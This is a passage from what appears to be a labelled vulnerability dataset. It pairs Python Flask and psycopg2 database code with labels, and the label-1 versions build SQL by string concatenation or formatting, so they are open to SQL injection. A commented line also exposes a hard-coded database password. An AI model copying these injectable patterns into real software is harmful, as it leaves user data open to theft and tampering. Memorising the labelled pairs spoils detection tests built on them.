request.get_json(force=True)\n    projectId = data['projectId']\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('DELETE FROM samwisedb.Project WHERE projectId = %s', (projectId,))\n    cursor.execute('DELETE FROM samwisedb.Subtask WHERE projectId = %s', (projectId,))\n    connection.commit()\n    return jsonify([])\n\n\n@app.route('/updateProject/', methods=['POST'])\ndef updateProject():\n    data = request.get_json(force=True)\n    projectId = data['projectid']\n    projectName = data['projectname']\n    dueDate = data['duedate']\n    courseId = data['course']\n\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('''\n       UPDATE samwisedb.Project\n       SET projectName=%s, dueDate=%s, courseId=%s\n       WHERE projectId=%s\n    ''', (projectName, dueDate, courseId, projectId))\n    connection.commit()\n    return jsonify(data)\n\n\n@app.route('/addProject/', methods=['POST'])\ndef addProject():\n    data = request.get_json(force=True)\n    userId = data['userId']\n    projectName = data['projectName']\n    courseId = data['courseId']\n    dueDate = data['dueDate']\n    subtasks = data['subtasks']\n\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('INSERT INTO samwisedb.Project(userId, projectName, dueDate, courseId) VALUES (%s, %s, %s, %s)',\n                   (userId, projectName, dueDate, courseId))\n    projectId = cursor.lastrowid\n    for subtask in subtasks:\n        cursor.execute('INSERT INTO samwisedb.Subtask(projectId, subtaskName) VALUES (%s, %s)', (projectId, subtask))\n    connection.commit()\n    return jsonify([projectId])\n\n\n@app.route('/getEvents/<userid>')\ndef getEvents(userid):\n    connection = get_db()\n\n    cursor = connection.cursor()\n\n    query = \"SELECT DISTINCT * FROM samwisedb.Event WHERE user = \\\"\" + userid + \"\\\";\"\n    cursor.execute(query)\n\n    data = [{\"eventName\": str(item[2]), \"startTime\": str(item[3]), \"endTime\": str(item[4]), \"tagId\": str(item[5])} for\n            item in cursor.fetchall()]\n\n    return json.dumps(data)\n\n\n@app.route('/removeEvent/', methods=['POST'])\ndef removeEvent():\n    if request.method == 'POST':\n        data = request.get_json(force=True)\n        eventId = data['eventId']\n\n        connection = get_db()\n\n        try:\n            cursor = connection.cursor()\n            query = \"DELETE FROM samwisedb.Event WHERE eventId = \\\"\" + eventId + \"\\\";\"\n            print(query)\n            cursor.execute(query)\n            connection.commit()\n        finally:\n            print (\"DONE\")\n\n    return json.dumps([])\n\n\n@app.route('/addEvent/', methods=['POST'])\ndef addEvent():\n    event_id = -1\n    if request.method == 'POST':\n        data = request.get_json(force=True)\n        user = data['user']\n        eventName = data['eventName']\n        startTime = data['startTime']\n        endTime = data['endTime']\n        tagId = data['tagId']\n\n        connection = get_db()\n\n        try:\n            cursor = connection.cursor()\n            query = \"insert into samwisedb.Event(user, eventName, startTime, endTime, tagId) values (\\\"\" + user + \"\\\", \\\"\" + eventName + \"\\\", \\\"\" + startTime + \"\\\", \\\"\" + endTime + \"\\\", \\\"\" + tagId + \"\\\");\"\n            print(query)\n            cursor.execute(query)\n            connection.commit()\n            event_id = cursor.lastrowid\n        finally:\n            print (\"DONE\")\n    return json.dumps([event_id])\n\n\n@app.route('/updateEvent/', methods=['POST'])\ndef updateEvent():\n    if request.method == 'POST':\n        data = request.get_json(force=True)\n        eventId = data['eventId']\n        eventName = data['eventName']\n        startTime = data['startTime']\n        endTime = data['endTime']\n        tagId = data['tagId']\n\n        connection = get_db()\n\n        try:\n            cursor = connection.cursor()\n            cursor.execute(\"\"\"\n               UPDATE samwisedb.Event\n               SET eventName=%s, startTime=%s, endTime=%s, tagId=%s\n               WHERE eventId=%s\n            \"\"\", (eventName, startTime, endTime, tagId, eventId))\n            connection.commit()\n        finally:\n            print (\"DONE\")\n\n    return json.dumps([])\n\n\n@app.route('/getTasks/<userId>', methods=['GET'])\ndef getTasks(userId):\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('SELECT DISTINCT * FROM samwisedb.Task WHERE user = %s', (userId,))\n    data = [{\n        'user': item[0],\n        'taskId': item[1],\n        'taskName': item[2],\n        'courseId': item[3],\n        'tag': item[4],\n        'dueDate': item[5],\n        'details': item[6]\n    } for item in cursor.fetchall()]\n\n    return jsonify(data)\n\n\n@app.route('/removeTask/', methods=['POST'])\ndef removeTask():\n    data = request.get_json(force=True)\n    taskId = data['taskid']\n\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('DELETE FROM samwisedb.Task WHERE taskId = %s', taskId)\n    connection.commit()\n\n    return json.dumps([])\n\n\n@app.route('/addTask/', methods=['POST'])\ndef addTaskCourse():\n    task_id = -1\n    if request.method == 'POST':\n        data = request.get_json(force=True)\n        userid = data['userid']\n        taskname = data['taskname']\n        course = data['course']\n        duedate = data['duedate']\n        details = data['details']\n\n        connection = get_db()\n\n        try:\n            cursor = connection.cursor()\n            query = \"INSERT into samwisedb.Task(user, taskName, courseId, dueDate, details) values (\\\"\" + userid + \"\\\", \\\"\" + taskname + \"\\\", \\\"\" + course + \"\\\", \\\"\" + duedate + \"\\\", \\\"\" + details + \"\\\");\"\n            print(query)\n            cursor.execute(query)\n            connection.commit()\n            task_id = cursor.lastrowid\n        finally:\n            print (\"DONE\")\n    return json.dumps([task_id])\n\n\n@app.route('/updateTask/', methods=['POST'])\ndef updateTask():\n    if request.method == 'POST':\n        data = request.get_json(force=True)\n        taskid = data['taskid']\n        taskname = data['taskname']\n        details = data['details']\n        duedate = data['duedate']\n        course = data['course']\n\n        taskid = int(taskid)\n\n        connection = get_db()\n\n        try:\n            cursor = connection.cursor()\n            cursor.execute(\"\"\"\n               UPDATE samwisedb.Task\n               SET taskName=%s, dueDate=%s, courseId=%s, details=%s\n               WHERE taskId=%s\n            \"\"\", (taskname, duedate, course, details, taskid))\n            connection.commit()\n        finally:\n            print (\"DONE\")\n\n    return json.dumps([])\n\n\n@app.route('/exams/<course_id>')\ndef getExams(course_id):\n    # Open the connection to database\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('SELECT time FROM samwisedb.Exam WHERE courseId = %s', (course_id,))\n    data = [{'course_id': course_id, 'start': item[0]} for item in cursor.fetchall()]\n    return jsonify(data)\n\n\n@app.route('/courses/<courseId>')\ndef getClassInfo(courseId):\n    # Open the connection to database\n    connection = get_db()\n\n    cursor = connection.cursor()\n    cursor.execute('SELECT startTime FROM samwisedb.Course WHERE courseId = %s', courseId)\n    data = [{\"course\": courseId + \" Class\", \"start\": str(item[0])} for item in cursor.fetchall()]\n    return json.dumps(data)\n\n\n@app.route('/addSubtask/', methods=['POST'])\ndef addSubtask():\n    data = request.get_json(force=True)\n    projectId = data['projectId']\n    subtask = data['subtask']\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('INSERT INTO samwisedb.Subtask(projectId, subtask) VALUES (%s, %s)', (projectId, subtask))\n    subtaskId = cursor.lastrowid\n    connection.commit()\n    return jsonify([subtaskId])\n\n\n@app.route('/removeSubtask/', methods=['POST'])\ndef removeSubtask():\n    data = request.get_json(force=True)\n    subtaskId = data['subtaskId']\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('DELETE FROM samwisedb.Subtask WHERE subtaskId = %s', (subtaskId,))\n    connection.commit()\n    return jsonify([subtaskId])\n\n\n@app.route('/updateSubtask/', methods=['POST'])\ndef updateSubtask():\n    data = request.get_json(force=True)\n    subtaskId = data['subtaskId']\n    subtaskName = data['subtaskName']\n    connection = get_db()\n    cursor = connection.cursor()\n    cursor.execute('UPDATE samwisedb.Subtask SET subtaskName = %s WHERE subtaskId = %s', (subtaskName, subtaskId))\n    connection.commit()\n    return jsonify([subtaskName])\n\n\n@app.route('/getColor/<name>')\ndef getColor(name):\n    return app.config['COLORS'][hash(name) % len(app.config['COLORS'])]\n\n\nif __name__ == \"__main__\":\n    app.run(debug=True)\n/n/n/n", "label": 1}, {"id": "5329d91f9e569c95184053c8e7ef596949c33ce9", "code": "modules/comment.py/n/nfrom modules import sql\n\n\nclass Comment:\n    def __init__(self,conn):\n        self.conn=conn;\n    \n    def getCommentsByUser(self,userid):\n        sqlText=\"select comment from comments order by date desc where userid=%s\"\n        params=[userid]\n        result=sql.queryDB(self.conn,sqlText,params)\n        return result;\n    \n    def getCommentsByPostid(self,postid,userid):\n        sqlText=\"select (select Count(*) from comment_like where \\\n        comments.commentid = comment_like.commentid) as like,(select Count(*) \\\n                from comment_like where comments.commentid = \\\n                comment_like.commentid and comment_like.userid=%s) as \\\n                flag,commentid,name,comment from users,comments where \\\n                users.userid=comments.userid and postid=%s order by date desc;\"\n        params=[userid,postid]\n        result=sql.queryDB(self.conn,sqlText,params)\n        return result;\n\n    def getCommentsLike(self,commentid):\n        sqlText=\"select userid from comment_like where commentid=%s\"\n        params=[commentid]\n        result=sql.queryDB(self.conn,sqlText,params)\n        return result;\n\t\n    def insertData(self,comment,userid,postid):\n        sqlText=\"insert into comments(comment,userid,date,postid) \\\n        values(%s,%s,current_timestamp(0),%s);\"\n        params=[comment,userid,postid]\n        result=sql.insertDB(self.conn,sqlText,params)\n        return result;\n\n    def deleteComment(self,commentid):\n        sqlText=\"delete from comments where commentid=%s\"\n        params=[commentid]\n        result=sql.deleteDB(self.conn,sqlText,params)\n        return result;\n\n    def likeComments(self,commentid,userid):\n        sqlText=\"insert into comment_like values(%s,%s);\"\n        params=[userid,commentid]\n        result=sql.insertDB(self.conn,sqlText,params)\n        return result;\n\n    def dislikeComments(self,commentid,userid):\n        sqlText=\"delete from comment_like where commentid=%s and userid=%s;\"\n        params=[commentid,userid]\n        result=sql.deleteDB(self.conn,sqlText,params)\n        return result;\n\n\n\n/n/n/nmodules/post.py/n/nfrom modules import sql\n\n\nclass Post:\n    def __init__(self,conn):\n        self.conn=conn;\n\n    def getAllPosts(self,userid):\n        sqlText=\"select users.name,post.comment,post.postid,(select Count(*) from post_like \\\n                where post.postid = post_like.postid) as like,\\\n                (select Count(*) from post_like where post.postid =post_like.postid \\\n                and post_like.userid=%s) as flag from users,post \\\n                where post.userid=users.userid and (post.userid in \\\n                (select friendid from friends where userid =%s) or post.userid=%s)\\\n                order by post.date desc;\"\n        params=[userid,userid,userid]\n        result=sql.queryDB(self.conn,sqlText,params)\n        return result;\n    \n    def getPostsByPostid(self,postid):\n        sqlText=\"select users.name,post.comment from users,post where \\\n                users.userid=post.userid and post.postid=%s\"\n        params=[postid]\n        result=sql.queryDB(self.conn,sqlText,params)\n        return result;\n    \n    def getPostLike(self,postid):\n        sqlText=\"select userid from post_like where postid=%s\"\n        params=[postid]\n        result=sql.queryDB(self.conn,sqlText,params)\n        return result;\n\n    def likePost(self,postid,userid):\n        sqlText=\"insert into post_like values(%s,%s);\"\n        params=[postid,userid]\n        result=sql.insertDB(self.conn,sqlText,params)\n        return result;\n\n    def dislikePost(self,postid,userid):\n        sqlText=\"delete from post_like where postid=%s and userid=%s;\"\n        params=[postid,userid]\n        result=sql.deleteDB(self.conn,sqlText,params)\n        return result;\n\n    def insertData(self,userid,post):\n        sqlText=\"insert into post(userid,date,comment) \\\n                values(%s,current_timestamp(0),%s);\"\n        params=[userid,post];\n        result=sql.insertDB(self.conn,sqlText,params)\n        return result;\n\n\n    def deletePost(self,postid):\n        sqlText=\"delete from post where post.postid=%s\"\n        params=[postid]\n        result=sql.deleteDB(self.conn,sqlText,params)\n        return result;\n/n/n/nmodules/sql.py/n/nimport psycopg2\n\n\n\n#\u94fe\u63a5\u6570\u636e\u5e93\ndef connectDB(dbname,uname,psw):\n    conn=psycopg2.connect(database=dbname,user=uname,password=psw,host=\"127.0.0.1\",port=\"5432\")\n    return conn\n\n\n#\u67e5\u8be2\u6570\u636e\u5e93\ndef queryDB(conn,sql_select,params):\n    print(\"query data\")\n    cur=conn.cursor()\n    try:\n        cur.execute(sql_select,params)\n        rows=cur.fetchall()\n    except Exception as err:\n        closeDB(conn)\n        print(err)\n    else:\n        return rows\n\n\n\n#\u63d2\u5165\u6570\u636e\ndef insertDB(conn,sql_insert,params):\n    cur=conn.cursor()\n    try:\n        cur.execute(sql_insert,params)\n        conn.commit()\n    except Exception as err:\n        closeDB(conn)\n        print(err)\n    else: \n        print(\"insert data successfull\")\n\n#delete data\ndef deleteDB(conn,sql_delete,params):\n    cur=conn.cursor()\n    try:\n        cur.execute(sql_delete,params)\n        conn.commit()\n    except Exception as err:\n        closeDB(conn)\n        print(err)\n    else: \n        print(\"delete data successfull\")\n\n\n#update data\ndef updateDB(conn,sql_update,params):\n    cur=conn.cursor()\n    try:\n        cur.execute(sql_update,params)\n        conn.commit()\n    except Exception as err:\n        closeDB(conn)\n        print(err)\n    else: \n        print(\"update data successfull\")\n\n\n\n#\u5173\u95ed\u94fe\u63a5\ndef closeDB(conn):\n    conn.close()\n\n\n\n/n/n/nmodules/users.py/n/nfrom modules import sql\n\nclass Users:\n    def __init__(self,conn=None,name=None,password=None,email=None,country=None):\n        self.name=name\n        self.password=password\n        self.email=email\n        self.country=country\n        self.conn=conn\n\n    def clean(self):\n        self.name=None;\n        self.password=None;\n        self.email=None;\n        self.count=None;\n \n\n    def userLogin(self):\n\n        sqlName=\"select count(*) from users where name=%s and password=%s;\"\n        params = [self.name,self.password]\n        checkName=sql.queryDB(self.conn,sqlName,params)\n        result=checkName[0][0]\n        if result == 0:\n            self.clean()\n            return False\n        else:\n            return True\n\n\n    def userApply(self):\n        sql_insert=\"insert into \\\n                users(name,password,email,country,inscription_date) \\\n                values(%s,%s,%s,%s,current_timestamp(0));\"\n\n        sqlName=\"select count(*) from users where name=%s;\"\n        params = [self.name]\n        checkName=sql.queryDB(self.conn,sqlName,params)\n        #no name\n        if checkName[0][0] == 0:\n            params.extend([self.password,self.email,self.country])\n            sql.insertDB(self.conn,sql_insert,params)\n            return True\n        else:\n            return False\n\n    def getUserID(self):\n        sqlName=\"select userid from users where name=%s;\"\n        params = [self.name]\n        userid=sql.queryDB(self.conn,sqlName,params)\n        return userid[0][0];\n\n    def getAllPosts(self):\n        sqlText=\"select comment from post where userid=%s order by date;\"\n        params = [self.userid]\n        allposts=sql.queryDB(self.conn,sqlName,params)\n        return allposts;\n\n\n    def getAllComments(self):\n        sqlText=\"select comment from comments where userid=%s order by date;\"\n        params = [self.userid]\n        allposts=sql.queryDB(self.conn,sqlText,params)\n        return allposts;\n\n    def getAllInformation(self,userid):\n        sqlText=\"select name,password,email,country from users where userid=%s;\"\n        params = [userid]\n        information=sql.queryDB(self.conn,sqlText,params)\n        return information;\n\n\n    def modifyUserInfo(self,userid,flag):\n        sqlText=\"update users \\\n                set name=%s,password=%s,email=%s,country=%s where userid=%s;\"\n        if(flag==1): \n            sqlName=\"select count(*) from users where name=%s;\"\n            params = [self.name]\n            checkName=sql.queryDB(self.conn,sqlName,params)\n            #no name\n            if checkName[0][0] == 0:\n                params.extend([self.password,self.email,self.country,userid])\n                sql.updateDB(self.conn,sqlText,params)\n                return True\n            else:\n                return False\n        else:\n            params=[self.name,self.password,self.email,self.country,userid]\n            sql.updateDB(self.conn,sqlText,params)\n            return True;\n\n    def followFriends(self,userid,friendid):\n        sqlText=\"insert into friends values(%s,%s);\"\n        params=[friendid,userid]\n        result=sql.insertDB(self.conn,sqlText,params)\n        return result;\n\n    def cancelFollow(self,userid,friendid):\n        sqlText=\"delete from friends where userid=%d and friendid=%s;\"\n        params=[userid,friendid]\n        result=sql.deleteDB(self.conn,sqlText,params)\n        return result;\n\n    def getUsers(self,userid):\n        sqlText=\"select userid,name,country,(select Count(*) from friends \\\n                where users.userid=friends.friendid and friends.userid=%s) as follow \\\n                from users;\"\n        params=[userid]\n        result=sql.queryDB(self.conn,sqlText,params)\n        return result;\n\n\n    def getUsersByName(self,userid,username):\n        sqlText=\"select userid,name,country,(select Count(*) from friends \\\n                where users.userid=friends.friendid and friends.userid=%s) as follow \\\n                from users where users.name~%s;\"\n        params=[userid,username]\n        result=sql.queryDB(self.conn,sqlText,params)\n        return result;\n\n\n\n\n\n\n\n/n/n/n", "label": 0}, {"id": "5329d91f9e569c95184053c8e7ef596949c33ce9", "code": "/modules/comment.py/n/nfrom modules import sql\n\n\nclass Comment:\n    def __init__(self,conn):\n        self.conn=conn;\n    \n    def getCommentsByUser(self,userid):\n        sqlText=\"select comment from comments order by date desc where userid=%d\"%(userid)\n        result=sql.queryDB(self.conn,sqlText)\n        return result;\n    \n    def getCommentsByPostid(self,postid,userid):\n        sqlText=\"select (select Count(*) from comment_like where comments.commentid = comment_like.commentid) as like,(select Count(*) from comment_like where comments.commentid = comment_like.commentid and comment_like.userid=%d) as flag,commentid,name,comment from users,comments where users.userid=comments.userid and postid=%d order by date desc;\"%(userid,postid)\n        result=sql.queryDB(self.conn,sqlText)\n        return result;\n\n    def getCommentsLike(self,commentid):\n        sqlText=\"select userid from comment_like where commentid=%d\"%(commentid)\n        result=sql.queryDB(self.conn,sqlText)\n        return result;\n\t\n    def insertData(self,comment,userid,postid):\n        sqlText=\"insert into comments(comment,userid,date,postid) values('%s',%d,current_timestamp(0),%d);\"%(comment,userid,postid)\n        result=sql.insertDB(self.conn,sqlText)\n        return result;\n\n    def deleteComment(self,commentid):\n        sqlText=\"delete from comments where commentid=%d\"%(commentid)\n        result=sql.deleteDB(self.conn,sqlText)\n        return result;\n\n    def likeComments(self,commentid,userid):\n        sqlText=\"insert into comment_like values(%d,%d);\"%(userid,commentid)\n        result=sql.insertDB(self.conn,sqlText)\n        return result;\n\n    def dislikeComments(self,commentid,userid):\n        sqlText=\"delete from comment_like where commentid=%d and userid=%d;\"%(commentid,userid)\n        result=sql.deleteDB(self.conn,sqlText)\n        return result;\n\n\n\n/n/n/n/modules/post.py/n/nfrom modules import sql\n\n\nclass Post:\n    def __init__(self,conn):\n        self.conn=conn;\n\n    def getAllPosts(self,userid):\n        sqlText=\"select users.name,post.comment,post.postid,(select Count(*) from post_like \\\n                where post.postid = post_like.postid) as like,\\\n                (select Count(*) from post_like where post.postid =post_like.postid \\\n                and post_like.userid=%d) as flag from users,post \\\n                where post.userid=users.userid and (post.userid in \\\n                (select friendid from friends where userid =%d) or post.userid=%d )\\\n                order by post.date desc;\"%(userid,userid,userid)\n        result=sql.queryDB(self.conn,sqlText)\n        return result;\n    \n    def getPostsByPostid(self,postid):\n        sqlText=\"select users.name,post.comment from users,post where \\\n                users.userid=post.userid and post.postid=%d\"%(postid)\n        result=sql.queryDB(self.conn,sqlText)\n        return result;\n    \n    def getPostLike(self,postid):\n        sqlText=\"select userid from post_like where postid=%d\"%(postid)\n        result=sql.queryDB(self.conn,sqlText)\n        return result;\n\n    def likePost(self,postid,userid):\n        sqlText=\"insert into post_like values(%d,%d);\"%(postid,userid)\n        result=sql.insertDB(self.conn,sqlText)\n        return result;\n\n    def dislikePost(self,postid,userid):\n        sqlText=\"delete from post_like where postid=%d and userid=%d;\"%(postid,userid)\n        result=sql.deleteDB(self.conn,sqlText)\n        return result;\n\n    def insertData(self,userid,post):\n        sqlText=\"insert into post(userid,date,comment) \\\n                values(%d,current_timestamp(0),'%s');\"%(userid,post);\n        result=sql.insertDB(self.conn,sqlText)\n        return result;\n\n\n    def deletePost(self,postid):\n        sqlText=\"delete from post where post.postid=%d\"%(postid)\n        result=sql.deleteDB(self.conn,sqlText)\n        return result;\n/n/n/n/modules/sql.py/n/nimport psycopg2\n\n\n\n#\u94fe\u63a5\u6570\u636e\u5e93\ndef connectDB(dbname,uname,psw):\n    #conn=psycopg2.connect(database=\"test\",user=\"lishaomin\",password=\"19931004\",host=\"127.0.0.1\",port=\"5432\")\n    conn=psycopg2.connect(database=dbname,user=uname,password=psw,host=\"127.0.0.1\",port=\"5432\")\n    return conn\n\n\n#\u67e5\u8be2\u6570\u636e\u5e93\ndef queryDB(conn,sql_select):\n    print(\"query data\")\n    cur=conn.cursor()\n    #sql_select=\"select * from users;\"\n    cur.execute(sql_select)\n    rows=cur.fetchall()\n    #for row in rows:\n    #print (\"user:%s\"%(row[1]))\n    return rows\n\n\n\n#\u63d2\u5165\u6570\u636e\ndef insertDB(conn,sql_insert):\n    cur=conn.cursor()\n    result=cur.execute(sql_insert)\n    conn.commit()\n    print(\"insert data successfull\")\n    return result\n\n#delete data\ndef deleteDB(conn,sql_delete):\n    cur=conn.cursor()\n    result=cur.execute(sql_delete)\n    conn.commit()\n    print(\"delete data successfull\")\n    return result\n\n\n#update data\ndef updateDB(conn,sql_update):\n    cur=conn.cursor()\n    result=cur.execute(sql_update)\n    conn.commit()\n    print(\"update data successfull\")\n    return result\n\n\n#\u5173\u95ed\u94fe\u63a5\ndef closeDB(conn):\n    conn.close()\n\n\n\n/n/n/n/modules/users.py/n/nfrom modules import sql\n\nclass Users:\n    def __init__(self,conn=None,name=None,password=None,email=None,country=None):\n        self.name=name\n        self.password=password\n        self.email=email\n        self.country=country\n        self.conn=conn\n\n    def clean(self):\n        self.name=None;\n        self.password=None;\n        self.email=None;\n        self.count=None;\n \n\n    def userLogin(self):\n\n        sqlName=\"select count(*) from users where name='%s' and \\\n                password='%s';\"%(self.name,self.password)\n        checkName=sql.queryDB(self.conn,sqlName)\n\n        result=checkName[0][0]\n        if result == 0:\n            self.clean()\n            return False\n        else:\n            return True\n\n\n    def userApply(self):\n        t_sql_insert=\"insert into \\\n                users(name,password,email,country,inscription_date) \\\n                values('{name}','{psw}','{email}','{country}',current_timestamp(0));\"\n        sql_insert=t_sql_insert.format(name=self.name,psw=self.password,\\\n                email=self.email,country=self.country)\n\n        sqlName=\"select count(*) from users where name='%s';\"%(self.name)\n        checkName=sql.queryDB(self.conn,sqlName)\n    \n        #no name\n        if checkName[0][0] == 0:\n            sql.insertDB(self.conn,sql_insert)\n            return True\n        else:\n            return False\n\n    def getUserID(self):\n        sqlName=\"select userid from users where name='%s';\"%(self.name)\n        userid=sql.queryDB(self.conn,sqlName)\n        return userid[0][0];\n\n    def getAllPosts(self):\n        sqlText=\"select comment from post where userid=%d order by date;\"\n        allposts=sql.queryDB(self.conn,sqlText)\n        return allposts;\n\n\n    def getAllComments(self):\n        sqlText=\"select comment from comments where userid=%d order by date;\"\n        allposts=sql.queryDB(self.conn,sqlText)\n        return allposts;\n\n    def getAllInformation(self,userid):\n        sqlText=\"select name,password,email,country from users where userid=%d;\"%(userid)\n        information=sql.queryDB(self.conn,sqlText)\n        return information;\n\n\n    def modifyUserInfo(self,userid,flag):\n        sqlText=\"update users \\\n                set name='%s',password='%s',email='%s',country='%s' \\\n                where userid='%d';\"%(self.name,self.password,self.email,self.country,userid)\n        if(flag==1): \n            sqlName=\"select count(*) from users where name='%s';\"%(self.name)\n            checkName=sql.queryDB(self.conn,sqlName)\n            #no name\n            if checkName[0][0] == 0:\n                sql.updateDB(self.conn,sqlText)\n                return True\n            else:\n                return False\n        else:\n            sql.updateDB(self.conn,sqlText)\n            return True;\n\n    def followFriends(self,userid,friendid):\n        sqlText=\"insert into friends values(%d,%d);\"%(friendid,userid)\n        result=sql.insertDB(self.conn,sqlText)\n        return result;\n\n    def cancelFollow(self,userid,friendid):\n        sqlText=\"delete from friends where userid=%d and friendid=%d;\"%(userid,friendid)\n        result=sql.deleteDB(self.conn,sqlText)\n        return result;\n\n    def getUsers(self,userid):\n        sqlText=\"select userid,name,country,(select Count(*) from friends \\\n                where users.userid=friends.friendid and friends.userid=%d) as follow \\\n                from users;\"%(userid)\n        result=sql.queryDB(self.conn,sqlText)\n        return result;\n\n\n    def getUsersByName(self,userid,username):\n        sqlText=\"select userid,name,country,(select Count(*) from friends \\\n                where users.userid=friends.friendid and friends.userid=%d) as follow \\\n                from users where users.name='%s';\"%(userid,username)\n        result=sql.queryDB(self.conn,sqlText)\n        return result;\n\n\n\n\n\n\n\n/n/n/n", "label": 1}, {"id": "3d3b5defd26ef7d205915bf643b6b1df90a15e44", "code": "timf/api/views.py/n/nfrom flask import jsonify, request\nfrom . import api\n\nfrom run import mysql\n\n\n@api.route('/items', methods=['GET'])\ndef list_items():\n    sql = '''SELECT id, name_enus from tblDBCItem where auctionable = true;'''\n    cursor = mysql.connection.cursor()\n    cursor.execute(sql)\n    data = cursor.fetchall()\n\n    results = []\n    for row in data:\n        item = {}\n        for tup in zip([column[0] for column in cursor.description], row):\n            item[tup[0]] = tup[1]\n\n        results.append(item)\n\n    return jsonify({\"items\": results})\n\n\n@api.route('/items/<int:item_id>', methods=['GET'])\ndef get_item(item_id):\n    sql = '''SELECT id, name_enus FROM tblDBCItem WHERE id = %s AND auctionable = true;'''\n    cursor = mysql.connection.cursor()\n    cursor.execute(sql, [item_id])\n    data = cursor.fetchone()\n\n    if data:\n        item = {}\n        for tup in zip([column[0] for column in cursor.description], data):\n            item[tup[0]] = tup[1]\n    else:\n        return jsonify({\"error\": \"item not found\"}), 404\n\n    return jsonify(item)\n\n\n@api.route('/item/', methods=['GET'])\ndef resolve_item_name():\n    data = []\n    query = request.args.get('name')\n\n    if query:\n        sql = '''SELECT id, name_enus FROM `tblDBCItem` WHERE name_enus LIKE %s;'''\n        cursor = mysql.connection.cursor()\n        cursor.execute(sql, [\"%\" + query + \"%\",])\n        data = cursor.fetchall()\n    else:\n        return jsonify({\"error\": \"No item ID or query provided\"}), 404\n\n    if data:\n        results = []\n        for row in data:\n            item = {}\n            for tup in zip([column[0] for column in cursor.description], row):\n                item[tup[0]] = tup[1]\n\n            results.append(item)\n    else:\n        return jsonify({\"error\": \"item not found\"}), 404\n\n    return jsonify({\"items\": results})\n/n/n/n", "label": 0}, {"id": "3d3b5defd26ef7d205915bf643b6b1df90a15e44", "code": "/timf/api/views.py/n/nfrom flask import jsonify, request\nfrom . import api\n\nfrom run import mysql\n\n\n@api.route('/items', methods=['GET'])\ndef list_items():\n    sql = '''SELECT id, name_enus from tblDBCItem where auctionable = true;'''\n    cursor = mysql.connection.cursor()\n    cursor.execute(sql)\n    data = cursor.fetchall()\n\n    results = []\n    for row in data:\n        item = {}\n        for tup in zip([column[0] for column in cursor.description], row):\n            item[tup[0]] = tup[1]\n\n        results.append(item)\n\n    return jsonify({\"items\": results})\n\n\n@api.route('/items/<int:item_id>', methods=['GET'])\ndef get_item(item_id):\n    sql = '''SELECT id, name_enus FROM tblDBCItem WHERE id = {} AND auctionable = true;'''.format(item_id)\n    cursor = mysql.connection.cursor()\n    cursor.execute(sql)\n    data = cursor.fetchone()\n\n    if data:\n        item = {}\n        for tup in zip([column[0] for column in cursor.description], data):\n            item[tup[0]] = tup[1]\n    else:\n        return jsonify({\"error\": \"item not found\"}), 404\n\n    return jsonify(item)\n\n\n@api.route('/item/', methods=['GET'])\ndef resolve_item_name():\n    item_name = request.args.get('name')\n    sql = '''SELECT id, name_enus FROM `tblDBCItem` WHERE name_enus LIKE \"%{}%\" '''.format(item_name)\n    cursor = mysql.connection.cursor()\n    cursor.execute(sql)\n    data = cursor.fetchall()\n\n    if data:\n        results = []\n        for row in data:\n            item = {}\n            for tup in zip([column[0] for column in cursor.description], row):\n                item[tup[0]] = tup[1]\n\n            results.append(item)\n    else:\n        return jsonify({\"error\": \"item not found\"}), 404\n\n    return jsonify({\"items\": results})\n/n/n/n", "label": 1}, {"id": "2f26b43e26d656190a7dfa0f399e2dc7c0dd9a37", "code": "tournament.py/n/n#!/usr/bin/env python\n#\n# tournament.py -- implementation of a Swiss-system tournament\n#\n\nimport psycopg2\n\n\ndef connect():\n    \"\"\"Connect to the PostgreSQL database.  Returns a database connection.\"\"\"\n    return psycopg2.connect(\"dbname=tournament\")\n\n\ndef deleteMatches():\n    \"\"\"Remove all the match records from the database.\"\"\"\n    db = connect()\n    c = db.cursor()\n    c.execute(\"DELETE FROM matches;\")\n    db.commit()\n    db.close\n\n\ndef deletePlayers():\n    \"\"\"Remove all the player records from the database.\"\"\"\n    deleteMatches()\n    db = connect()\n    c = db.cursor()\n    c.execute(\"DELETE FROM players;\")\n    db.commit()\n    db.close\n\n\ndef countPlayers():\n    \"\"\"Returns the number of players currently registered.\"\"\"\n    db = connect()\n    c = db.cursor()\n    c.execute(\"SELECT COUNT(*) FROM players;\")\n    rows = c.fetchall()\n    db.commit()\n    db.close\n    return rows[0][0]\n\n\ndef registerPlayer(name):\n    \"\"\"Adds a player to the tournament database.\n\n    The database assigns a unique serial id number for the player.  (This\n    should be handled by your SQL database schema, not in your Python code.)\n\n    Args:\n      name: the player's full name (need not be unique).\n    \"\"\"\n\n    db = connect()\n    c = db.cursor()\n    # remove any occurance of quotes/apostrophes to prevent sql injection\n    safe_n = name=name.translate(None, '\\'\\\"')\n    query = \"INSERT INTO players (name) values ('{name}')\".format(name=safe_n)\n    c.execute(query)\n    db.commit()\n    db.close()\n\n\ndef playerStandings():\n    \"\"\"Returns a list of the players and their win records, sorted by wins.\n\n    The first entry in the list should be the player in first place, or a player\n    tied for first place if there is currently a tie.\n\n    Returns:\n      A list of tuples, each of which contains (id, name, wins, matches):\n        id: the player's unique id (assigned by the database)\n        name: the player's full name (as registered)\n        wins: the number of matches the player has won\n        matches: the number of matches the player has played\n    \"\"\"\n    db = connect()\n    c = db.cursor()\n    c.execute(\"SELECT * FROM standings\")\n    rows = c.fetchall()\n    db.close()\n    return rows\n\n\ndef reportMatch(winner, loser):\n    \"\"\"Records the outcome of a single match between two players.\n\n    Args:\n      winner:  the id number of the player who won\n      loser:  the id number of the player who lost\n    \"\"\"\n    w = str(winner)\n    l = str(loser)\n    db = connect()\n    c = db.cursor()\n    c.execute(\"INSERT INTO matches values (%s, %s)\" % (w, l))\n    db.commit()\n    db.close()\n\n\ndef swissPairings():\n    \"\"\"Returns a list of pairs of players for the next round of a match.\n\n    Assuming that there are an even number of players registered, each player\n    appears exactly once in the pairings.  Each player is paired with another\n    player with an equal or nearly-equal win record, that is, a player adjacent\n    to him or her in the standings.\n\n    Returns:\n      A list of tuples, each of which contains (id1, name1, id2, name2)\n        id1: the first player's unique id\n        name1: the first player's name\n        id2: the second player's unique id\n        name2: the second player's name\n    \"\"\"\n    